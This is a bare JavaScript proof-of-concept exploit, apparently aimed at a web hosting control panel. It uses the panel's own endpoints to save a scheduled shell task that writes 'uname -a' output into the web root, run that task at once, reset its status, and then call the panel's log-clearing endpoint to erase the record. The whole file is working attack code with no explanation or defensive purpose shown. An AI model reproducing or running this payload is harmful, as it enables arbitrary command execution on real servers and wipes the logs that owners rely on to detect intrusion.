function poc(){
  $.get('/service/app/tasks.php?type=task_list',{},function(data){
    var id=data.data[0].ID;
    $.post('/service/app/tasks.php?type=exec_task',{
      tid:id
    },function(res){
      $.post('/service/app/tasks.php?type=set_task_status',{
        task_id:id,
        status:0
      },function(res1){
        $.post('/service/app/tasks.php?type=set_task_status',{
          task_id:id,
          status:0
        },function(res2){
          $.post("/service/app/log.php?type=clearlog",{
            type:"clearlog"
          },function(res3){},"json");
        },"json");
      },"json");
    },"json");
  },"json");
}
function save(){
  var data=new Object();
  data.task_id="";
  data.title="test";
  data.exec_cycle="1";
  data.week="1";
  data.day="3";
  data.hour="13";
  data.minute = "51";
  data.shell="uname -a>/www/admin/localhost_80/wwwroot/1.txt";
  $.post('/service/app/tasks.php?type=save_shell',data,function(res){
    poc();
  },'json');
}
save();